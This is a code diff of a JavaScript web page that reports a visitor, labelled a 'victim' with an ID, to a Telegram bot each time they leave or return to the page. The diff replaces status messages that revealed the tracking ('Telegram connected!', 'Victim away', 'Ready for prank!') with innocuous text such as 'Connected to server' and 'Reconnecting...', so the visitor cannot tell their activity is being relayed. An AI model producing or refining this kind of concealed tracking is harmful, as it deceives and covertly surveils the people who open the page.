@@ -58,9 +58,9 @@
         .then(function(data) {
             console.log('Telegram bot test:', data);
             if (data.ok) {
-                document.getElementById('connection-status').innerHTML = '🟢 Telegram connected!';
+                document.getElementById('connection-status').innerHTML = '🟢 Connected to server';
             } else {
-                document.getElementById('connection-status').innerHTML = '🔴 Telegram error: ' + data.description;
+                document.getElementById('connection-status').innerHTML = '🔴 Connection error: ' + data.description;
             }
         })
         .catch(function(error) {
@@ -120,7 +120,7 @@
             '⏰ ' + timeString
         );
         
-        document.getElementById('connection-status').innerHTML = '🟢Connected';
+        document.getElementById('connection-status').innerHTML = '🟢 Connected to server';
     }
     
     // =============================================
@@ -146,10 +146,10 @@
     function onPageHidden() {
         if (document.hidden) {
             sendTelegramMessage('⚠️ VICTIM AWAY | ID: ' + victimId + ' | Switched to another app');
-            document.getElementById('connection-status').innerHTML = '🟡 Victim away - App switched';
+            document.getElementById('connection-status').innerHTML = '🟡 Reconnecting...';
         } else {
             sendTelegramMessage('✅ VICTIM RETURNED | ID: ' + victimId + ' | Back to the page');
-            document.getElementById('connection-status').innerHTML = '🟢 Victim connected - Ready for prank!';
+            document.getElementById('connection-status').innerHTML = '🟢 Connected to server';
         }
     }
     
